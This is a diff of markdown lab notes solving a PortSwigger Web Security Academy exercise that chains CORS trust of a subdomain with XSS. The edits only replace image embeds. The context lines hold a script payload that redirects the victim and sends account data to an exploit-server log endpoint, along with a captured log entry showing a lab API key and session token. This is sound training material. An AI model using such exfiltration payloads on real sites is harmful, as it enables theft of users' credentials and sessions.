@@ -5,14 +5,14 @@ resource:
 Rectified my rookie mistake this time, by checking every allow origin header i.e. `Access-Control-Allow-Origin: null`
 `Access-Control-Allow-Origin: https://sha-bang.com`
 `Access-Control-Allow-Origin: *`
-![[Pasted image 20260904113450.png]]![[Pasted image 20260904113629.png]]![[Pasted image 20260904114014.png]]
+![capture](../images/lab3/null.png)![capture2](../images/lab3/unknown.png)![capture3](../images/lab3/alt.png)
 
 Check for same body with a different scheme/protocol and different domain/subdomain as well
-![[Pasted image 20260904114416.png]]![[Pasted image 20260904114827.png]]
+![capture4](../images/lab3/diff-scheme.png)![capture5](../images/lab3/diff-host.png)
 
 Vulnerable to XSS
 https://stock.0ab500b5040f90c980f7c381000b000e.web-security-academy.net/?productId=1&storeId=1
-![[Pasted image 20260904121631.png]]
+![capture6](../images/lab3/xss-check.png)
 
 <script>
 document.location="https://stock.0ab500b5040f90c980f7c381000b000e.web-security-academy.net/?productId=<script>
@@ -30,7 +30,7 @@ location='https://exploit-0a0800a2041e73b882b9faa8015600db.exploit-server.net/lo
 But this code won't work because
 So we need to do url encoding. For that purpose go to decoder of burp type the special character and replace them with their url encoded equivalent.
 
-![[Pasted image 20260904122645.png]]
+![capture7](../images/lab3/url-encoding.png)
 
 URL Encoded Code:
 
@@ -56,7 +56,7 @@ Then within the url we're running a script to get the account details from stock
 
 Using the portswigger academy's payload/script
 
-![[Pasted image 20260904124348.png]]
+![capture8](../images/lab3/admin.png)
 
 `"GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22SDwcWNFtIOj550zdaEz3m8AITd4fNMXY%22,%20%20%22sessions%22:%20[%20%20%20%20%224Uqg9U9cHjkhJHrp8GvaaLN4A22gXZz9%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"`
 
